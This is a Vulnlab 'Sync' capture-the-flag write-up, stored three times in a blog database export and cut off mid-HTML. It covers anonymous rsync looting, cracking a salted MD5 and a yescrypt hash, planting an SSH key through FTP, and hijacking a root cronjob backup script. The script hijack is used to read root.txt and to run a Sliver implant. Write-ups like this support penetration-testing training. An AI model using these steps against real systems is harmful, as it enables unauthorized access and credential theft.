altered the file itself so that it would be running a [Sliver](https://github.com/BishopFox/sliver) implant instead of the regular archive backup script. As you can see from the below, we received a callback as `root`. Not required - but just in case you wanted to see how to get a shell as `root`\n\n![](/images/vulnlab/sync-vl/c.jpg)\n\n# Conclusion\n\nThis was a really enjoyable machine, as it tested a bit of theory crafted with what was in front of you - especially being able to reverse engineer the hash during the initial foothold. I also enjoyed the credential hunting/reusage and the backup script alteration was really enjoyable. Much thanks to xct for the development of this machine!\n\n# Resources\n\nhttps://linux.die.net/man/1/rsync\nhttps://sqlite.org/cli.html\nhttps://hashes.com/en/tools/hash_identifier\nhttps://github.com/DaZ-CYBER/s_md5_hc\nhttps://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\nhttps://github.com/BishopFox/sliver\n","source":"_posts/sync.md","raw":"---\ntitle: Sync - Vulnlab\ndate: 2024-06-05 14:22:42\ntags: [vulnlab, Easy]\ncategories: vulnlab\nkeywords: 'Vulnlab, Easy, Linux'\ndescription: This is I believe the second Linux machine that I've written a post about, and I liked how it delved more into hash cracking and the infamous Docker (oh how I despise Docker). This specific machine is really helpful if you want to understand ports that aren't used very often such as `rsync`.\ncover: /images/vulnlab/sync-vl/sync_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nThis is I believe the second Linux machine that I've written a post about, and I liked how it delved more into hash cracking and the infamous Docker (oh how I despise Docker). This specific machine is really helpful if you want to understand ports that aren't used very often such as `rsync`.\n\n# Enumeration\n\nLet's start with our regular NMAP scans.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-31 19:17 EDT\nNmap scan report for 10.10.110.153\nHost is up (0.11s latency).\nNot shown: 996 closed tcp ports (reset)\nPORT    STATE SERVICE\n21/tcp  open  ftp\n22/tcp  open  ssh\n80/tcp  open  http\n873/tcp open  rsync\n\nNmap done: 1 IP address (1 host up) scanned in 13.54 seconds\n```\n\nAfter a few aggressive scans, you'll find that there is no anonymous login enabled for FTP. Along with that, both SSH and HTTP are login services (HTTP only having a web login). We'll need credentials to access any of these - so we'll turn our attention to the service on `873`.\n\nThis service is called [RSYNC](https://linux.die.net/man/1/rsync), and is essentially a filesystem mounting/share service. It allows administrators to copy files from one particular location in the filesystem to another, or allows them to mount it to a location similar to `NFS`. This is used if users need to have files copied to another location in a quick-manner. In our case, `rsync` is a tool that we can examine to determine if there are any files currently within the service that we can retrieve.\n\n# RSYNC File Enumeration\n\nFirst we'll authenticate with null credentials and list all contents that are currently on the service.\n\n```\n└─$ rsync -av --list-only rsync://10.10.110.153\nhttpd           web backup\n```\n\nYou'll see that there are two results - `httpd` and `web/backup`. The first result `httpd` is relative to a mount that we can retrieve with the same `rsync` utility. As for the other results, these are directories within the `httpd` backup. We can grab both of them with a single command.\n\nLet's download the contents of this mount to our local machine. (Note the `init_scan.txt` file is my NMAP scan)\n\n```\n└─$ rsync -r 10.10.76.90::httpd/ .\n\n└─$ ls\ndb  init_scan.txt  migrate  www\n```\n\nThis will give us three folders that we can parse, `migrate`, `www`, and `db`.\n\nThe `migrate` directory seems to be empty and does not have anything within it.\n\nThe `www` directory seems to be a directory that consists of the content of the website. It has three different files - `index.php`, `dashboard.php`, and `logout.php`. The interesting thing we can pick apart form it is the `index.php` file, which contains the contents of the login prompt that we receive if we try to access the HTTP service. You'll notice though at the top of the file we can see the following code.\n\n```php\n$secure = \"6c4972f3717a5e881e282ad3105de01e\";\n\nif (isset($_SESSION['username'])) {\n    header('Location: dashboard.php');\n    exit();\n}\n\nif (isset($_POST['username']) && isset($_POST['password'])) {\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n\n    $hash = md5(\"$secure|$username|$password\");\n    $db = new SQLite3('../db/site.db');\n    $result = $db->query(\"SELECT * FROM users WHERE username = '$username' AND password= '$hash'\");\n    $row = $result->fetchArray(SQLITE3_ASSOC);\n    if ($row) {\n```\n\nThe above code seems to reference a `$hash` and includes a secure salt at the top of the page denoted as `6c4972f3717a5e881e282ad3105de01e`. The page itself seems to be pulling from an SQLITE database, which is within a directory named `db` that is similar to what we downloaded prior from RSYNC. The format of the hash seems to be `$secure|$username|$password`, which is the format that the hash uses. Given that we don't have the username or passwords yet, we'll move onto the `db` directory.\n\nFinally, the `db` directory contains an SQLITE database file titled `site.db`. My assumption is that this is the database that the website pulls from. If the website is checking the hashed string with a variable within the database - we might be able to find the same password in plaintext within the database.\n\nI've found out how to interact with SQLITE databases [here](https://sqlite.org/cli.html). We can use `sqlite3 site.db` to interact with this file. It will bring us to an SQL UI, in which we can simply dump the contents with `sqlite> .dump`.\n\n```\nsqlite> .dump\nPRAGMA foreign_keys=OFF;\nBEGIN TRANSACTION;\nCREATE TABLE users (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    username TEXT NOT NULL,\n    password TEXT NOT NULL\n);\nINSERT INTO users VALUES(1,'admin','7658a2741c9df3a97c819584db6e6b3c');\nINSERT INTO users VALUES(2,'triss','a0de4d7f81676c3ea9eabcadfd2536f6');\nDELETE FROM sqlite_sequence;\nINSERT INTO sqlite_sequence VALUES('users',2);\nCOMMIT;\n```\n\nThe `users` table contains two hash values for two users - `admin` and `triss`. Now that we have hashes, usernames, and a secure salt to use - let's try to crack them. We'll start with the `triss` user.\n\nYou'll notice that some online hashing cracking tools like this one [here](https://hashes.com/en/tools/hash_identifier) will tell you that this is an MD5 hash - which it is. The only exception is that we have a salt that is added to the password for its decryption - meaning we need to determine the format in which the salt is used. \n\n# Hash Cracking w/ Python\n\nSo the whole point of this is to crack the hash and determine how we can utilize said cracked hash to authenticate to the machine - whether that be through the web service or through directly to the machine with SSH/FTP. Since we have the user's hashed password and the salt that the hash uses, we could test some connected strings and put them into `hashcat`.\n\nThe only issue with that is that it would take a lot of trial and error. We know that the salt, username, and password were all hashed into MD5, however there are at least 100 different MD5 hashing algorithms that `hashcat` has. We'd eventually get it after a little bit of testing - but why not try to use a bit of coding for this?\n\nWe know that the hash itself just uses a standard MD5 hashing algorithm to combine all three values (salt, username, password). Before they are passed to the MD5 function, they are separated with a delimiter value being `|`. Since we know how the password is being hashed, we can develop our own brute-force proof-of-concept to see if we can reverse-engineer the hashing algorithm\n\nI uploaded the code to one of my GitHub repositories that you can find [here](https://github.com/DaZ-CYBER/s_md5_hc). I'm still improving on my coding skills, so you may not be polished 100%. Nonetheless, this ended up doing the job efficiently. The only real caveat to the POC is that it uses `rockyou` to crack the hashes and essentially just attempts to match the hash of every string in the wordlist with the hexadecimal digest of `triss`'s hashed password. If you end up utilizing this for another machine that has the same salt, make sure to change the `algorithm_hash` value in the code to account for the users password.\n\n```\n└─$ python3 md5.py -s 6c4972f3717a5e881e282ad3105de01e -u triss -w /usr/share/wordlists/rockyou.txt\nUser: daz\nCracking Hash for: Triss\nInitializing...\n{'salt': '6c4972f3717a5e881e282ad3105de01e', 'username': 'triss', 'wordlist': '/usr/share/wordlists/rockyou.txt'}\n.......\nTesting [...snip...] against a0de4d7f81676c3ea9eabcadfd2536f6; Match found: [...snip...]\n```\n\nAs you can see, it seems as though we received the correct password for the `triss` user. Let's try to authenticate to the other parts of the machine with these creds.\n\n# FTP Write Access to SSH\n\nSo after some quick password usage you'll find that you can authenticate to the HTTP server - though we can't interact with anything on the dashboard. SSH isn't an avenue we can take at the moment with these creds either - as it seems as though a public key is required to authenticate to `triss`.\n\n![](/images/vulnlab/sync-vl/b.jpg)\n\nHowever using our newly-found creds, we're able to access FTP as the `triss` user.\n\n```\nftp> ls -la\n229 Entering Extended Passive Mode (|||19317|)\n150 Here comes the directory listing.\ndrwxr-x---    2 1003     1003         4096 Apr 21  2023 .\ndrwxr-x---    2 1003     1003         4096 Apr 21  2023 ..\nlrwxrwxrwx    1 0        0               9 Apr 21  2023 .bash_history -> /dev/null\n-rw-r--r--    1 1003     1003          220 Apr 19  2023 .bash_logout\n-rw-r--r--    1 1003     1003         3771 Apr 19  2023 .bashrc\n-rw-r--r--    1 1003     1003          807 Apr 19  2023 .profile\n226 Directory send OK.\n```\n\nThis directory that we land in seems to replicate a lot of what we'd see in a home directory on a Linux machine. Although there are no defining factors in any of the files within this directory that tell us this is `triss`'s home directory - we can assume it based on the fact that this is where we landed.\n\nIf you take a look at the permissions on the `.` file (which indicates the current folder), you can see that the owner of this folder has write access onto it. Since we authenticated as the `triss` user, we should be able to write into this directory and put any files that are needed to get shell access. This is where SSH comes back into the picture.\n\nIf you remember, it wasn't letting us authenticate to SSH as we needed a public key to be able to authenticate to the machine. Given that we have access to the `triss` home directory, we could theoretically create an SSH folder and generate a private/public key pair that we can use to authenticate through to SSH. Let's first start by creating a folder named `.ssh` into the home directory by running `ftp> mkdir .ssh`.\n\nNext, we'll generate an SSH key on our local machine with the below command.\n\n```\n└─$ ssh-keygen -t rsa                           \nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/daz/.ssh/id_rsa): id_rsa\n```\n\nMake sure to leave the passphrase empty so we don't have to specify any passwords when attempting to authenticate. A couple things we'll need to do after generate the `private` and `public` key pairs is to change the `id_rsa.pub` file name to `authorized_keys` so SSH can utilize it as a proper key file. We'll also use `chmod 600` to both files to ensure that we can utilize them properly in the SSH context.\n\nAfter that, we'll upload the `authorized_keys` file to the SSH directory.\n\n```\nftp> put authorized_keys\nlocal: authorized_keys remote: authorized_keys\n229 Entering Extended Passive Mode (|||16937|)\n150 Ok to send data.\n100% |*********************************************************************************|   562        2.18 MiB/s    00:00 ETA\n226 Transfer complete.\n562 bytes sent in 00:00 (2.45 KiB/s)\nftp> ls\n229 Entering Extended Passive Mode (|||48072|)\n150 Here comes the directory listing.\n-rw-------    1 1003     1003          562 Jun 01 20:31 authorized_keys\n226 Directory send OK.\n```\n\nNow that we have the `authorized_keys` file uploaded, we can now authenticate with our private key to the machine. \n\n```\n└─$ ssh -i id_rsa triss@10.10.118.167\n......\ntriss@ip-10-10-200-238:~$\n```\n\n# Filesystem Enumeration\n\nWe now have SSH access as the user `triss`, though you won't find a user flag within their home directory.\n\nWe'll need to pivot to the other users on the machine. If you check the `/home` directory, you'll find users `httpd`, `jennifer`, `sa`, and `ubuntu`. We also aren't able to run anything as `sudo` as our current user.\n\nI tested our creds for `triss` against all of these users, and we were able to login as `jennifer` with the same password.\n\n```\ntriss@ip-10-10-200-238:~$ su jennifer\nPassword: \njennifer@ip-10-10-200-238:/home/triss$ cd ~\njennifer@ip-10-10-200-238:~$ ls\nuser.txt\n```\n\nNow that we have the user flag, we can enumerate a little further into the machine.\n\nI dropped [Linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) to disk to find the next part of the attack path, though you probably won't need it. In the root directory of this machine, you'll find an abnormal `backups` folder that isn't common to be seen here. Within the folder itself, you'll see a list of backups for the machine.\n\n```\njennifer@ip-10-10-200-238:/backup$ ls\n1717273681.zip  1717274041.zip  1717274401.zip  1717274761.zip  1717275121.zip  1717275481.zip\n1717273801.zip  1717274161.zip  1717274521.zip  1717274881.zip  1717275241.zip  1717275601.zip\n1717273921.zip  1717274281.zip  1717274641.zip  1717275002.zip  1717275361.zip\n```\n\nI downloaded the first one back to my machine by standing up a Python server on the local SSH session. The first archive's filename is `1717273681.zip`, and after decompressing it you'll find a few interesting files.\n\n```\n└─$ ls\nhttpd  passwd  rsyncd.conf  shadow\n\n└─$ cat shadow\n......\nsa:$y$j9T$jJFOBCaiGJUmyZZRFn5aG1$7pSWDUlnIOlXInoK4nn3gCEIiMp94x8sXaV.DtTzM6D:19468:0:99999:7:::\n```\n\nIt seems that a backup of the `shadow` file was generated and placed within this archive. We can see the hash of the `sa` user, one of the users that was within the `/home` directory.\n\nI've dealt with these hashes before, and due to the `$y$` delimiter in front of the hash means that it is a `yescrypt` hash. These aren't able to be cracked through `hashcat` as I believe it does not support `yescrypt` hashes. There is a format in `JTR` that should be able to decrypt it properly.\n\n```\n└─$ john sa.txt --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (crypt, generic crypt(3) [?/64])\nCost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes\nCost 2 (algorithm specific iterations) is 1 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n[...snip...]           (?)     \n1g 0:00:00:04 DONE (2024-06-01 16:59) 0.2277g/s 43.73p/s 43.73c/s 43.73C/s daniela..november\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\n\nViewing the above, you can see that we were successfully able to decrypt this user's hash and can now determine whether we can log in as them or not. If you run `su sa` and user their password, you should be able to login successfully.\n\n# Escalation to Root\n\nI ran `Linpeas` one more time to see if there was anything else we could access, as it seems as though we don't have any `sudo` privileges as this user either. If you continue to look at the output of Linpeas, you'll find an odd `backup.sh` file located with `/usr/local/bin`.\n\n```\n**sa@ip-10-10-200-238:/usr/local/bin$ cat backup.sh\n#!/bin/bash\n\nmkdir -p /tmp/backup\ncp -r /opt/httpd /tmp/backup\ncp /etc/passwd /tmp/backup\ncp /etc/shadow /tmp/backup\ncp /etc/rsyncd.conf /tmp/backup\n......\n```\n\nThis file seems to be running in the context of `sa`, so we can alter our privileges to write to it. Given that this script is pulling `shadow` from the `/etc/shadow`, there must be a cronjob/task running as `root`. We know this because we could see the `shadow` file within the archive when we were retrieving the creds for `sa`. If this file is owned by `sa`, the only way it can retrieve the `shadow` file is if it is a user that has `root` level permissions.\n\nTo exploit this, we can really do a variety of things. You'll need to change the permissions of the file with `chmod 777`, and then we can download it locally to alter it.\n\nWhat you do with this file is really up to you. If you want to read the file plain and easy, you can add the following to the file so that it compresses `/root/root.txt` to the archive.\n\n```\n#!/bin/bash\n\nmkdir -p /tmp/backup\ncp -r /opt/httpd /tmp/backup\ncp /etc/passwd /tmp/backup\ncp /etc/shadow /tmp/backup\ncp /etc/rsyncd.conf /tmp/backup\ncp /root/root.txt /tmp/backup\nzip -r /backup/$(date +%s).zip /tmp/backup\n```\n\nI also made sure to remove the section where it removes `/tmp/backup`, so we don't have to compress it to see the results.\n\nAnother method you could do is upload a reverse shell called `backup.sh` so the root cronjob will run your reverse shell instead of the backup file.\n\nAfter a few minutes of waiting, you can see that the archive will be generated as root.\n\n```\nsa@ip-10-10-200-238:/tmp/backup$ ls\nhttpd  passwd  root.txt  rsyncd.conf  shadow\n```\n\nSince we were able to downloaded and read the `root.txt` file, this confirms our theory of the cronjob running as root. This being the case, we have successfully rooted this machine!\n\nI also altered the file itself so that it would be running a [Sliver](https://github.com/BishopFox/sliver) implant instead of the regular archive backup script. As you can see from the below, we received a callback as `root`. Not required - but just in case you wanted to see how to get a shell as `root`\n\n![](/images/vulnlab/sync-vl/c.jpg)\n\n# Conclusion\n\nThis was a really enjoyable machine, as it tested a bit of theory crafted with what was in front of you - especially being able to reverse engineer the hash during the initial foothold. I also enjoyed the credential hunting/reusage and the backup script alteration was really enjoyable. Much thanks to xct for the development of this machine!\n\n# Resources\n\nhttps://linux.die.net/man/1/rsync\nhttps://sqlite.org/cli.html\nhttps://hashes.com/en/tools/hash_identifier\nhttps://github.com/DaZ-CYBER/s_md5_hc\nhttps://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\nhttps://github.com/BishopFox/sliver\n","slug":"sync","published":1,"updated":"2024-06-05T20:04:43.149Z","_id":"clx25tzi00000mluf348z4xs0","comments":1,"layout":"post","photos":[],"content":"<p>This is I believe the second Linux machine that I’ve written a post about, and I liked how it delved more into hash cracking and the infamous Docker (oh how I despise Docker). This specific machine is really helpful if you want to understand ports that aren’t used very often such as <code>rsync</code>.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start with our regular NMAP scans.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-31 19:17 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.110.153</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 996 closed tcp ports (reset)</span><br><span class=\"line\">PORT    STATE SERVICE</span><br><span class=\"line\">21/tcp  open  ftp</span><br><span class=\"line\">22/tcp  open  ssh</span><br><span class=\"line\">80/tcp  open  http</span><br><span class=\"line\">873/tcp open  rsync</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds</span><br></pre></td></tr></table></figure>\n\n<p>After a few aggressive scans, you’ll find that there is no anonymous login enabled for FTP. Along with that, both SSH and HTTP are login services (HTTP only having a web login). We’ll need credentials to access any of these - so we’ll turn our attention to the service on <code>873</code>.</p>\n<p>This service is called <a href=\"https://linux.die.net/man/1/rsync\">RSYNC</a>, and is essentially a filesystem mounting&#x2F;share service. It allows administrators to copy files from one particular location in the filesystem to another, or allows them to mount it to a location similar to <code>NFS</code>. This is used if users need to have files copied to another location in a quick-manner. In our case, <code>rsync</code> is a tool that we can examine to determine if there are any files currently within the service that we can retrieve.</p>\n<h1 id=\"RSYNC-File-Enumeration\"><a href=\"#RSYNC-File-Enumeration\" class=\"headerlink\" title=\"RSYNC File Enumeration\"></a>RSYNC File Enumeration</h1><p>First we’ll authenticate with null credentials and list all contents that are currently on the service.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ rsync -av --list-only rsync://10.10.110.153</span><br><span class=\"line\">httpd           web backup</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see that there are two results - <code>httpd</code> and <code>web/backup</code>. The first result <code>httpd</code> is relative to a mount that we can retrieve with the same <code>rsync</code> utility. As for the other results, these are directories within the <code>httpd</code> backup. We can grab both of them with a single command.</p>\n<p>Let’s download the contents of this mount to our local machine. (Note the <code>init_scan.txt</code> file is my NMAP scan)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ rsync -r 10.10.76.90::httpd/ .</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ ls</span><br><span class=\"line\">db  init_scan.txt  migrate  www</span><br></pre></td></tr></table></figure>\n\n<p>This will give us three folders that we can parse, <code>migrate</code>, <code>www</code>, and <code>db</code>.</p>\n<p>The <code>migrate</code> directory seems to be empty and does not have anything within it.</p>\n<p>The <code>www</code> directory seems to be a directory that consists of the content of the website. It has three different files - <code>index.php</code>, <code>dashboard.php</code>, and <code>logout.php</code>. The interesting thing we can pick apart form it is the <code>index.php</code> file, which contains the contents of the login prompt that we receive if we try to access the HTTP service. You’ll notice though at the top of the file we can see the following code.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$secure</span> = <span class=\"string\">&quot;6c4972f3717a5e881e282ad3105de01e&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;username&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&#x27;Location: dashboard.php&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$hash</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"string\">&quot;<span class=\"subst\">$secure</span>|<span class=\"subst\">$username</span>|<span class=\"subst\">$password</span>&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$db</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">SQLite3</span>(<span class=\"string\">&#x27;../db/site.db&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"string\">&quot;SELECT * FROM users WHERE username = &#x27;<span class=\"subst\">$username</span>&#x27; AND password= &#x27;<span class=\"subst\">$hash</span>&#x27;&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$row</span> = <span class=\"variable\">$result</span>-&gt;<span class=\"title function_ invoke__\">fetchArray</span>(SQLITE3_ASSOC);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$row</span>) &#123;</span><br></pre></td></tr></table></figure>\n\n<p>The above code seems to reference a <code>$hash</code> and includes a secure salt at the top of the page denoted as <code>6c4972f3717a5e881e282ad3105de01e</code>. The page itself seems to be pulling from an SQLITE database, which is within a directory named <code>db</code> that is similar to what we downloaded prior from RSYNC. The format of the hash seems to be <code>$secure|$username|$password</code>, which is the format that the hash uses. Given that we don’t have the username or passwords yet, we’ll move onto the <code>db</code> directory.</p>\n<p>Finally, the <code>db</code> directory contains an SQLITE database file titled <code>site.db</code>. My assumption is that this is the database that the website pulls from. If the website is checking the hashed string with a variable within the database - we might be able to find the same password in plaintext within the database.</p>\n<p>I’ve found out how to interact with SQLITE databases <a href=\"https://sqlite.org/cli.html\">here</a>. We can use <code>sqlite3 site.db</code> to interact with this file. It will bring us to an SQL UI, in which we can simply dump the contents with <code>sqlite&gt; .dump</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlite&gt; .dump</span><br><span class=\"line\">PRAGMA foreign_keys=OFF;</span><br><span class=\"line\">BEGIN TRANSACTION;</span><br><span class=\"line\">CREATE TABLE users (</span><br><span class=\"line\">    id INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class=\"line\">    username TEXT NOT NULL,</span><br><span class=\"line\">    password TEXT NOT NULL</span><br><span class=\"line\">);</span><br><span class=\"line\">INSERT INTO users VALUES(1,&#x27;admin&#x27;,&#x27;7658a2741c9df3a97c819584db6e6b3c&#x27;);</span><br><span class=\"line\">INSERT INTO users VALUES(2,&#x27;triss&#x27;,&#x27;a0de4d7f81676c3ea9eabcadfd2536f6&#x27;);</span><br><span class=\"line\">DELETE FROM sqlite_sequence;</span><br><span class=\"line\">INSERT INTO sqlite_sequence VALUES(&#x27;users&#x27;,2);</span><br><span class=\"line\">COMMIT;</span><br></pre></td></tr></table></figure>\n\n<p>The <code>users</code> table contains two hash values for two users - <code>admin</code> and <code>triss</code>. Now that we have hashes, usernames, and a secure salt to use - let’s try to crack them. We’ll start with the <code>triss</code> user.</p>\n<p>You’ll notice that some online hashing cracking tools like this one <a href=\"https://hashes.com/en/tools/hash_identifier\">here</a> will tell you that this is an MD5 hash - which it is. The only exception is that we have a salt that is added to the password for its decryption - meaning we need to determine the format in which the salt is used. </p>\n<h1 id=\"Hash-Cracking-w-Python\"><a href=\"#Hash-Cracking-w-Python\" class=\"headerlink\" title=\"Hash Cracking w&#x2F; Python\"></a>Hash Cracking w&#x2F; Python</h1><p>So the whole point of this is to crack the hash and determine how we can utilize said cracked hash to authenticate to the machine - whether that be through the web service or through directly to the machine with SSH&#x2F;FTP. Since we have the user’s hashed password and the salt that the hash uses, we could test some connected strings and put them into <code>hashcat</code>.</p>\n<p>The only issue with that is that it would take a lot of trial and error. We know that the salt, username, and password were all hashed into MD5, however there are at least 100 different MD5 hashing algorithms that <code>hashcat</code> has. We’d eventually get it after a little bit of testing - but why not try to use a bit of coding for this?</p>\n<p>We know that the hash itself just uses a standard MD5 hashing algorithm to combine all three values (salt, username, password). Before they are passed to the MD5 function, they are separated with a delimiter value being <code>|</code>. Since we know how the password is being hashed, we can develop our own brute-force proof-of-concept to see if we can reverse-engineer the hashing algorithm</p>\n<p>I uploaded the code to one of my GitHub repositories that you can find <a href=\"https://github.com/DaZ-CYBER/s_md5_hc\">here</a>. I’m still improving on my coding skills, so you may not be polished 100%. Nonetheless, this ended up doing the job efficiently. The only real caveat to the POC is that it uses <code>rockyou</code> to crack the hashes and essentially just attempts to match the hash of every string in the wordlist with the hexadecimal digest of <code>triss</code>‘s hashed password. If you end up utilizing this for another machine that has the same salt, make sure to change the <code>algorithm_hash</code> value in the code to account for the users password.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 md5.py -s 6c4972f3717a5e881e282ad3105de01e -u triss -w /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">User: daz</span><br><span class=\"line\">Cracking Hash for: Triss</span><br><span class=\"line\">Initializing...</span><br><span class=\"line\">&#123;&#x27;salt&#x27;: &#x27;6c4972f3717a5e881e282ad3105de01e&#x27;, &#x27;username&#x27;: &#x27;triss&#x27;, &#x27;wordlist&#x27;: &#x27;/usr/share/wordlists/rockyou.txt&#x27;&#125;</span><br><span class=\"line\">.......</span><br><span class=\"line\">Testing [...snip...] against a0de4d7f81676c3ea9eabcadfd2536f6; Match found: [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, it seems as though we received the correct password for the <code>triss</code> user. Let’s try to authenticate to the other parts of the machine with these creds.</p>\n<h1 id=\"FTP-Write-Access-to-SSH\"><a href=\"#FTP-Write-Access-to-SSH\" class=\"headerlink\" title=\"FTP Write Access to SSH\"></a>FTP Write Access to SSH</h1><p>So after some quick password usage you’ll find that you can authenticate to the HTTP server - though we can’t interact with anything on the dashboard. SSH isn’t an avenue we can take at the moment with these creds either - as it seems as though a public key is required to authenticate to <code>triss</code>.</p>\n<p><img src=\"/images/vulnlab/sync-vl/b.jpg\"></p>\n<p>However using our newly-found creds, we’re able to access FTP as the <code>triss</code> user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ftp&gt; ls -la</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||19317|)</span><br><span class=\"line\">150 Here comes the directory listing.</span><br><span class=\"line\">drwxr-x---    2 1003     1003         4096 Apr 21  2023 .</span><br><span class=\"line\">drwxr-x---    2 1003     1003         4096 Apr 21  2023 ..</span><br><span class=\"line\">lrwxrwxrwx    1 0        0               9 Apr 21  2023 .bash_history -&gt; /dev/null</span><br><span class=\"line\">-rw-r--r--    1 1003     1003          220 Apr 19  2023 .bash_logout</span><br><span class=\"line\">-rw-r--r--    1 1003     1003         3771 Apr 19  2023 .bashrc</span><br><span class=\"line\">-rw-r--r--    1 1003     1003          807 Apr 19  2023 .profile</span><br><span class=\"line\">226 Directory send OK.</span><br></pre></td></tr></table></figure>\n\n<p>This directory that we land in seems to replicate a lot of what we’d see in a home directory on a Linux machine. Although there are no defining factors in any of the files within this directory that tell us this is <code>triss</code>‘s home directory - we can assume it based on the fact that this is where we landed.</p>\n<p>If you take a look at the permissions on the <code>.</code> file (which indicates the current folder), you can see that the owner of this folder has write access onto it. Since we authenticated as the <code>triss</code> user, we should be able to write into this directory and put any files that are needed to get shell access. This is where SSH comes back into the picture.</p>\n<p>If you remember, it wasn’t letting us authenticate to SSH as we needed a public key to be able to authenticate to the machine. Given that we have access to the <code>triss</code> home directory, we could theoretically create an SSH folder and generate a private&#x2F;public key pair that we can use to authenticate through to SSH. Let’s first start by creating a folder named <code>.ssh</code> into the home directory by running <code>ftp&gt; mkdir .ssh</code>.</p>\n<p>Next, we’ll generate an SSH key on our local machine with the below command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ssh-keygen -t rsa                           </span><br><span class=\"line\">Generating public/private rsa key pair.</span><br><span class=\"line\">Enter file in which to save the key (/home/daz/.ssh/id_rsa): id_rsa</span><br></pre></td></tr></table></figure>\n\n<p>Make sure to leave the passphrase empty so we don’t have to specify any passwords when attempting to authenticate. A couple things we’ll need to do after generate the <code>private</code> and <code>public</code> key pairs is to change the <code>id_rsa.pub</code> file name to <code>authorized_keys</code> so SSH can utilize it as a proper key file. We’ll also use <code>chmod 600</code> to both files to ensure that we can utilize them properly in the SSH context.</p>\n<p>After that, we’ll upload the <code>authorized_keys</code> file to the SSH directory.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ftp&gt; put authorized_keys</span><br><span class=\"line\">local: authorized_keys remote: authorized_keys</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||16937|)</span><br><span class=\"line\">150 Ok to send data.</span><br><span class=\"line\">100% |*********************************************************************************|   562        2.18 MiB/s    00:00 ETA</span><br><span class=\"line\">226 Transfer complete.</span><br><span class=\"line\">562 bytes sent in 00:00 (2.45 KiB/s)</span><br><span class=\"line\">ftp&gt; ls</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||48072|)</span><br><span class=\"line\">150 Here comes the directory listing.</span><br><span class=\"line\">-rw-------    1 1003     1003          562 Jun 01 20:31 authorized_keys</span><br><span class=\"line\">226 Directory send OK.</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the <code>authorized_keys</code> file uploaded, we can now authenticate with our private key to the machine. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ssh -i id_rsa triss@10.10.118.167</span><br><span class=\"line\">......</span><br><span class=\"line\">triss@ip-10-10-200-238:~$</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Filesystem-Enumeration\"><a 